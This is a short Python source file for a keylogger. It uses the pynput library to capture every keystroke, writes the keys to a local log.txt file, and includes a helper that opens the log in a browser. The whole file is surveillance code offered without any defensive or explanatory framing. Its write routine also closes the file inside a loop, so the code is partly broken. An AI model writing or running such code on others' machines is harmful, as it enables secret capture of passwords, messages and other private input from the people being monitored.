from pynput.keyboard import Key, Listener
import webbrowser

count = 0
keys = []


def keylogging():
    def on_press(key):
        global keys, count
        # print(key)
        keys.append(key)  # append each key to the empty list
        count += 1
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open("log.txt", "a+") as file1:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    file1.write('\n')
                    file1.close()
                elif k.find("Key") == -1:
                    file1.write(k)

    with Listener(on_press=on_press) as listener:
        listener.join()

def openlogfile():
    webbrowser.open("log.txt")